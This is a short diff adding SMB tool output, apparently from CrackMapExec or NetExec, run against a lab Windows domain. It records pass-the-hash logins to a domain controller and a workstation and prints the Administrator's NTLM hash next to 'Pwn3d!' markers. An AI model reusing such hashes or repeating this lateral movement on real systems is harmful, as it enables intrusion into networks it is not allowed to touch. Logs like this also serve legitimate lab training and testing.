@@ -1,0 +1,5 @@
+SMB         10.10.20.10     445    LABDC            [*] Windows Server 2019 Build 17763 x64 (name:LABDC) (domain:lab-01.local) (signing:True) (SMBv1:False)
+SMB         10.10.20.10     445    LABDC            [+] lab-01.local\Administrator:c5d73fd255b69aad0b8be3420b2b03c8 (Pwn3d!)
+SMB         10.10.20.22     445    LABWS2           [*] Windows Server 2019 Build 17763 x64 (name:LABWS2) (domain:lab-01.local) (signing:False) (SMBv1:False)
+SMB         10.10.20.22     445    LABWS2           [+] lab-01.local\Administrator:c5d73fd255b69aad0b8be3420b2b03c8 
+SMB         10.10.20.22     445    LABWS2           [+] lab-01.local\backup.ops:******** (Pwn3d!)
